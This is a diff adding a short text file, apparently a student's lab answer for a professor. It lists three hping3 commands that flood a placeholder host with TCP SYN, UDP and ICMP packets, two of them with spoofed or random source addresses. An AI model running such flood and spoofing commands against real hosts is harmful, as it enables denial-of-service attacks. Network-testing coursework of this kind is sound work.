@@ -1,0 +1,14 @@
+since you said just the commands and not neccessarily the result.
+
+commands
+
+10,000 TCP =>  hping3 -S --flood --rand-source -c 10000 your(prof)_ip
+    
+
+
+9,000 UDP =>  hping3 --udp -c 9000 -i u10000 -a 1.2.3.4 your(prof)_ip
+
+
+
+
+11,000ICMP => hping3 --icmp -c 11000 -d 1024 -i u13333 your(prof)_ip
